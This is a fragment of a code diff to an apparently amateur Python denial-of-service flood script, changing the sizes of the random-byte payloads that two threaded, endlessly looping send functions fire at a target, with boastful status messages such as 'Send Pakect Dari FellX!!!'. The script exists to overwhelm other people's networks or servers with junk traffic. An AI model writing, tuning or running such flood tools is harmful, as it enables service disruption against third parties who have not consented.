@@ -12,7 +12,7 @@ choice = str(input(" Gas?(y/n): "))
 times = int(input(" Packets: "))
 threads = int(input(" Threads: "))
 def run():
-  data = random._urandom(111222)
+  data = random._urandom(20179)
   i = random.choice(("[Fell]","[Wibu]","[Waifu]"))
   while True:
     try:
@@ -25,7 +25,7 @@ def run():
       print("[!] | Send Pakect Dari FellX!!! |")
 
 def run2():
-  data = random._urandom(16892)
+  data = random._urandom(1800)
   i = random.choice(("[Fell]","[Wibu]","[Waifu]"))
   while True:
     try:
